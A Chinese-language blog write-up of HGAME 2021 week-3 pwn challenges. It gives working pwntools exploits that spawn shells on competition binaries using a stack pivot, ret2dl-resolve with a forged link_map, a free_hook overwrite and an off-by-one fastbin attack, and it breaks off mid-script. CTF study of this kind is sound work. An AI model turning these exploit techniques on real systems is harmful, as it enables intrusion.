@@ -1,0 +1,276 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HGAME2021-WEEK3-PWN-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x40070a) sh.sendlineafter(&#34;!\n&#34;,payload) puts_addr"><meta property="og:image" content><meta property="og:title" content="HGAME2021-WEEK3-PWN-WP"><meta property="og:description" content="blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x40070a) sh.sendlineafter(&#34;!\n&#34;,payload) puts_addr"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1090.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-16T16:08:00+00:00"><meta property="article:modified_time" content="2021-02-16T16:08:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME2021-WEEK3-PWN-WP"><meta name=twitter:description content="blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x40070a) sh.sendlineafter(&#34;!\n&#34;,payload) puts_addr"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME2021-WEEK3-PWN-WP</h1><div class=meta>Posted on Feb 16, 2021</div></div><section class=body><h3 id=blackgive>blackgive</h3><p>栈迁移</p><h4 id=exp>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./blackgive&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = remote(&#34;&#34;)</span>
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;</span>)
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./blackgive&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0x400813</span>
+</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x6010A0</span>
+</span></span><span style=display:flex><span>off <span style=color:#666>=</span> <span style=color:#40a070>0xA0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;paSsw0rd&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(bss_base <span style=color:#666>+</span> off <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x4007A3</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;password:&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> off <span style=color:#666>+</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40070a</span>) 
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> puts_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;puts&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;paSsw0rd&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;password:&#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=without_leak>without_leak</h3><p>64 位 <code>ret2dl-resolve</code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 <code>ret2dl-resolve</code>。由于提供了 <code>libc</code>，考虑通过伪造 <code>link_map</code> 结构体 getshell。打本地的时候，即便打通了也会有</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3374585519.png></div><p>这个 <code>Got EOF</code>，一般这个时候就是说明失败了，而且用 <code>exec 1>&amp;0</code> 也无用，导致我浪费了很多时间调试。最后终于想到用 <code>mkdir</code> 测试一下才知道成功 getshell 了。</p><p>关于调试，由于我们的伪造，<code>sym->st_other</code> 是指向 <code>read@got - 8</code> 的，也就是 <code>close@got</code>，要保证 <code>close</code> 被解析过才能正常运行，否则会崩溃。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./without_leak&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30483</span>)
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./without_leak&#34;</span>)
+</span></span><span style=display:flex><span>bss_addr <span style=color:#666>=</span> <span style=color:#40a070>0x404B00</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>ret2csu_payload</span>(rbx,rbp,call_addr,argv1,argv2,argv3):
+</span></span><span style=display:flex><span>    csu1 <span style=color:#666>=</span> <span style=color:#40a070>0x40123A</span>
+</span></span><span style=display:flex><span>    csu2 <span style=color:#666>=</span> <span style=color:#40a070>0x401220</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#666>=</span> p64(csu1)
+</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#666>+</span> p64(argv1) <span style=color:#666>+</span> p64(argv2) <span style=color:#666>+</span> p64(argv3) <span style=color:#666>+</span> p64(call_addr)
+</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(csu2)
+</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>7</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>fake_Linkmap_payload</span>(elf,fake_linkmap_addr,known_func_ptr,offset):
+</span></span><span style=display:flex><span>    plt0 <span style=color:#666>=</span> elf<span style=color:#666>.</span>get_section_by_name(<span style=color:#4070a0>&#39;.plt&#39;</span>)<span style=color:#666>.</span>header<span style=color:#666>.</span>sh_addr
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> p64(offset <span style=color:#666>&amp;</span> (<span style=color:#40a070>2</span> <span style=color:#666>**</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>))<span style=color:#60a0b0;font-style:italic>#l_addr</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>17</span>)<span style=color:#60a0b0;font-style:italic>#l_name</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>)<span style=color:#60a0b0;font-style:italic>#l_ld</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64((fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x30</span> <span style=color:#666>-</span> offset) <span style=color:#666>&amp;</span> (<span style=color:#40a070>2</span> <span style=color:#666>**</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>))<span style=color:#60a0b0;font-style:italic>#l_next</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>7</span>)<span style=color:#60a0b0;font-style:italic>#l_prev</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)<span style=color:#60a0b0;font-style:italic>#l_real</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)<span style=color:#60a0b0;font-style:italic>#l_ns</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>6</span>)<span style=color:#60a0b0;font-style:italic>#l_libname</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(known_func_ptr <span style=color:#666>-</span> <span style=color:#40a070>8</span>)<span style=color:#60a0b0;font-style:italic>#l_info[0] tags</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> linkmap<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;A&#39;</span>)
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr)
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x38</span>)
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> linkmap<span style=color:#666>.</span>ljust(<span style=color:#40a070>0xf8</span>,<span style=color:#4070a0>&#39;A&#39;</span>)
+</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    resolve_call <span style=color:#666>=</span> p64(plt0 <span style=color:#666>+</span> <span style=color:#40a070>6</span>) <span style=color:#666>+</span> p64(fake_linkmap_addr) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (linkmap,resolve_call)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>offset <span style=color:#666>=</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> offset
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;system offset:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;system&#39;</span>]))
+</span></span><span style=display:flex><span>fake_linkmap_addr <span style=color:#666>=</span> bss_addr <span style=color:#666>+</span> <span style=color:#40a070>0x100</span>
+</span></span><span style=display:flex><span>linkmap, resolve_call <span style=color:#666>=</span> fake_Linkmap_payload(elf,fake_linkmap_addr,elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;read&#39;</span>],libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;system&#39;</span>] <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;read&#39;</span>])
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> ret2csu_payload(<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;read&#39;</span>],<span style=color:#40a070>0</span>,fake_linkmap_addr,<span style=color:#007020>len</span>(linkmap))
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x401156</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh.sendafter(&#39;input&gt; \n&#39;,rop.chain().ljust(0x200,&#39;a&#39;))</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;input&gt; </span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;a&#39;</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(linkmap)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> offset
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x40101a</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x401243</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x48</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> resolve_call
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=todolist>todolist</h3><p>这道题就不说了，和上周的题是几乎一样的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./todolist&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30411</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#007020>len</span>(payload)))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;check?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>2048</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]</span>
+</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#log.success(&#34;malloc_hook:&#34; + hex(malloc_hook)) </span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(p64(malloc_hook - 0x10),1)</span>
+</span></span><span style=display:flex><span>edit(p64(free_hook),<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
+</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
+</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>看完之后就觉得这题可以用上周的 exp 来打，所以就 <code>cp</code> 了一下上周的，但是没看清所处的目录，一个 tab 一个回车之后我 blackgive 的 exp 就没了。</p><h3 id=library-management-system>Library management System</h3><p><code>off by one</code></p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/338423648.png></div><p>这个读入函数是会多读一个字节的，所以我们利用他来修改下一个 chunk 的 size 域。做法就是先申请4个 chunk，记作A，B，C，D。由于本题没有修改的功能，所以需要先 <code>free</code> A，再 <code>alloc</code> A，通过对 A <code>off by one</code> 修改 chunk B 的 <code>size</code> 域，使 chunk B 的 <code>size</code>为 B 和 C 的和（这是为了在 <code>free</code>的时候通过检测。同时这个和需要大于0x80，这样 <code>free</code>的时候才会进 <code>Unsorted Bin</code>）实现 <code>chunk overlapping</code>，然后 <code>free</code>掉 B，再把 B 申请回来就可以通过 <code>show</code>的功能 leak 出 libc。然后再来一轮，这次先 <code>free</code>掉 C，再对 B <code>chunk overlapping</code>，修改 C 的 fd，使之指向 <code>&__malloc_hook - 0x23</code>。指向这个奇怪地址的原因是因为 <code>fastbin</code> 会对目标 chunk 的 <code>size</code> 做检测</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/240291959.png></div><p>可见 <code>malloc</code> 附近并没有可以作为 <code>size</code> 。好在 <code>fastbin</code> 并不会对地址对齐做检测，所以我们通过字节错位来伪造出 <code>size</code>，也就是 从 <code>&__malloc_hook - 0x23</code> 开始的这个 chunk 了。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/4254668762.png></div><p>就是这样一个效果，我们就可以实现 <code>arbitrary alloc</code> 了。</p><h4 id=exp-1>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
+</span></span><span style=display:flex><span># coding=utf-8
+</span></span><span style=display:flex><span>from pwn import *
+</span></span><span style=display:flex><span>context(log_level = &#39;debug&#39;)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#sh = process(&#34;./library&#34;)
+</span></span><span style=display:flex><span>sh = remote(&#34;182.92.108.71&#34;,30431)
+</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
